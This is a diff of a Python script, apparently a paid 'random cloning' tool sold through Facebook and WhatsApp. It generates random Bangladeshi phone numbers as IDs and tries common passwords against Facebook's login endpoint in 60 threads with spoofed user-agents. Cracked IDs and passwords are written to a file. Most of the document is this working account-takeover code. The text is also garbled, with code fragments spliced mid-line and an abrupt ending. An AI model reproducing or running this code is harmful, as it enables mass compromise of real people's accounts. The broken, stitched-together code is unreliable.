@@ -298,6 +298,242 @@ def b(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
+                print(f'\r\33[1;92m [HRIDOYE-OK] '+cid+' | '+ps+'\33[0;92m')
+                #print(f'\r\033[1;92m=[💚]=COOKIE : '+coki)
+                oks.append(cid)
+                open('/sdcard/HRIDOYE-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
+                break
+            else:
+                continue
+        loop+=1        
+    except:
+
+        pass
+def superuser():
+    UMO="HRIDOYE-"
+    uuid = str(os.geteuid()) + str(os.getlogin()) 
+    id = "5".join(uuid)
+    print(logo)
+    DARK=requests.get("https://github.com/Masud-Hridoye404/PAID-TEST/blob/main/CONTROL.tex").text
+    if id in DARK:
+        Main()
+    else:
+        os.system("clear")
+        os.system("xdg-open https://www.facebook.com/profile.php?id=100093402519904")
+        time.sleep(3.0)
+        
+        os.system("clear")
+        print(logo)
+        print("\t\033[30m   [\033[1;32m\033[47m First Get Approvel\033[00m\033[1;30m]")
+        print ("")
+        print("┌━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┐ \n\033[1;32m│ Note : That is Paid because 100% ok id just now login│\033[1;37m\n└━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┘")
+        print ("")
+        print("                Your Key is Not Approved ")
+        print("               Copy And Send Key To Admin")
+        print ("")
+        print (" Your Key : "+UMO+id)
+        print ("\n")
+        os.system("espeak \"assalamualaikum ,I am HRIDOYE VAI er  ROBOT and my boss is hridoye.Sir this tool is paid because 100% ok id just now login\"")
+        name = input(" Your Name : ")
+        os.system(f"espeak \"{name} ,prass Enter to send your key\"")
+        print ("")
+        input(" Press Enter To Send Key")
+        os.system("xdg-open https://www.facebook.com/profile.php?id=100093402519904")
+        superuser()        
+superuser()        k=random.randrange(40,150)
+        l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]'
+        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+        ugen.append(fullagnt)
+
+nka = [
+"NokiaX2-02/8.0 (11.57) Profile/MIDP-2.1 Configuration/CLDC-1.1",
+"NokiaX4-01/5.0 (08.65) Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0",
+"nokia6610I/1.0 (4.10) Profile/MIDP-1.0 Configuration/CLDC-1.0 (FAST WAP Proxy/1.0)",
+]
+
+
+  
+class jalan:
+    def __init__(self, z):
+        for e in z + "\n":
+            sys.stdout.write(e)
+            sys.stdout.flush()
+            time.sleep(0.001)
+sys.stdout.write('\x1b[1;35m\x1b]2; MAHIDI X HRIDOY \x07')
+
+logo=("""
+\033[31;1m╔╦╗╔═╗╦ ╦╔═╗╔╦╗╦  ─┐ ┬  ╦ ╦╦═╗╦╔╦╗╔═╗╦ ╦╔═╗
+\033[32;1m║║║╠═╣╠═╣╠═╣ ║║║  ┌┴┬┘  ╠═╣╠╦╝║ ║║║ ║╚╦╝║╣ 
+\033[33;1m╩ ╩╩ ╩╩ ╩╩ ╩═╩╝╩  ┴ └─  ╩ ╩╩╚═╩═╩╝╚═╝ ╩ ╚═╝
+\x1b[38;5;46m______________________________________________________
+ \033[1;31m[\033[1;32m[H]\033[1;31m]\033[1;32m DEVELOPER : ARIYAN HRIDOYE 
+ \033[1;31m[\033[1;32m[R]\033[1;31m]\033[1;32m DEVELOPER : MD MAHADI
+ \033[1;31m[\033[1;32m[I]\033[1;31m]\033[1;32m FACEBOOK  : ARIYAN HRIDOYE 
+ \033[1;31m[\033[1;32m[D]\033[1;31m]\033[1;32m GITHUB    : MAHADI-HRIDOYE
+ \033[1;31m[\033[1;32m[O]\033[1;31m]\033[1;32m TOOLS     : RENDOM
+ \033[1;31m[\033[1;32m[Y]\033[1;31m]\033[1;32m VERSION   : \033[1;31m[V-9]
+\x1b[38;5;46m_____________________________________________________
+""")
+A = '\x1b[1;97m' 
+B = '\x1b[1;96m' 
+C = '\x1b[1;91m' 
+D = '\033[38;5;46m'
+M = '\033[1;31m'
+H = '\033[38;5;46m'
+N = '\x1b[1;37m'    
+E = '\x1b[1;93m' 
+F = '\x1b[1;94m'
+G = '\x1b[1;95m'
+P = '\033[1;37m'
+def cek_apk(session,coki):
+	w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+	sop = BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	if len(game)==0:
+		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO ACTIVE APK")
+	else:
+		print("")
+		print(f'\r🎮 %sYOUR ACTIVE APPLICATION DETAILS :'%(H))
+		for i in range(len(game)):
+			print("%s%s. %s%s"%(H,i+1,game[i].replace("ACTIVE"," ACTIVE"),N))
+	w=session.get("https://x.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+	sop = BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	if len(game)==0:
+		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO EXPIRED APK")
+	else:
+		print(f'\r 🎮 %sYOUR EXPIRED APPLICATION DETAILS :'%(M))
+		for i in range(len(game)):
+			print("%s%s. %s%s"%(K,i+1,game[i].replace("Expired"," Expired"),N))
+def Main():
+	os.system('clear')
+	print(logo)
+	print("[\033[1;37m01]\33[1;92mSTART RANDOM CLONING")
+	print("[\033[1;37m02]\33[1;92mCONTACT ADMIN & FB GROUP")
+	print("[\033[1;37m03]\33[1;92mFOLLOW MY FB PROFILE")
+	print("[\033[1;37m04]\33[1;92mJOIN MESSENGER GROUP")
+	print('[\033[1;37m00]\33[1;92mEXIT PROGRAMMING')
+	print(54*'━')
+	opt = input('Choose option >>> ')
+	if opt in ["A","1"]:
+		virusA()
+	if opt in ["B","2"]:
+		admin()
+	if opt in ["C","3"]:
+		os.system('xdg-open https://www.facebook.com/profile.php?id=100093402519904');time.sleep(1)
+		fb()
+	if opt in ["D","4"]:
+		os.system('xdg-open https://wa.me/+8801780210942');time.sleep(1)
+		group()
+	if opt in ["0","0"]:
+		exit()
+		
+	else:
+		print('\n\033[1;92mChoose valid option\033[0;97m');time.sleep(1)
+		Main()
+def admin():
+	os.system('clear')
+	print(logo)
+	print(50*'_')
+	print(' [1] Contract WhatsApp ')
+	print(' [2] JOIN MY FB GROUP ')
+	print(' [3] FOLLOW MY GITHUB ')
+	print(' [0] Back to Main menu')
+	bal = input('Choose option >>> ')
+	if bal =='1':
+		os.system('xdg-open https://wa.me/+8801916564949');time.sleep(1)
+		admin()
+	if bal =='2':
+		os.system('xdg-open https://www.facebook.com/MDMehedi191');time.sleep(1)
+		admin()
+	if bal =='3':
+		os.system('xdg-open https://github.com/Mr-HRIDOYE-404');time.sleep(1)
+		admin()
+	if bal =='0':
+		Main()
+		
+def virusA():
+	user=[]
+	os.system('clear')
+	print(logo)
+	print(" ┏━[•] BD SIM CODE 017 018 019 013 015 016]")
+	kode = input(' ┗━[+] SELECT : ')
+	doamin = ' BD Number id cloner [ONLY-OK] '
+	print(' ┏━[•] EXAMPLE : 1000,5000,10000,15000,20000] ')
+	limit = int(input(' ┗━[+] LIMIT : '))
+	for nmbr in range(limit):
+		koda = ''.join(random.choice(string.digits) for _ in range(2))
+		kodb = ''.join(random.choice(string.digits) for _ in range(2))
+		nmp = ''.join(random.choice(string.digits) for _ in range(4))
+		user.append(nmp)
+	with ThreadPool(max_workers=60) as yaari:
+		os.system('clear')
+		print(logo)
+		tl = str(len(user))
+		print('┏━[•] COUNTRY    : Bangladesh')
+		print('┣━[•] TOTAL ID   :  '+tl)
+		print(f'┣━[•] SIM CODE   : \033[1;92m {kode} ')
+		print('\033[1;97m┗━[•] \033[1;92mSTART BD NAMBER MIXT CRACKING... ')
+		print(50*'━')
+		for guru in user:
+			uid = kode+koda+kodb+guru
+			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you']
+			yaari.submit(b,uid,pwx,tl)
+	print(50*'_')
+	print(' [💉] Crack process has been completed')
+	print(' [💉] Ids saved in ok.txt,cp.txt')
+	print(50*'_')
+	exit()
+
+def b(uid,pwx,tl):
+    global loop
+    global cps    
+    global oks
+    global agents
+    try:
+        for ps in pwx:
+            session = requests.Session()
+            sys.stdout.write(f'\r \033[1;90m[\033[1;93m[HRIDOYE]\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.flush()
+            pro = random.choice(ugen)
+            #oo=random.choice(sss)
+            free_fb = session.get('https://p.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {'authority': 'p.facebook.com',
+            'method': 'GET',
+            'path': '/login/device-based/login/async/',
+            'scheme': 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"11.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': pro,}
+            lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[65:80]
                 print(f'\r\33[1;92m [HRI#DEC BYB:- ASHIK CHOWDHURY
 #GITHUB:- RX-ASHIK
 #FUCK YOU MEHEDI 
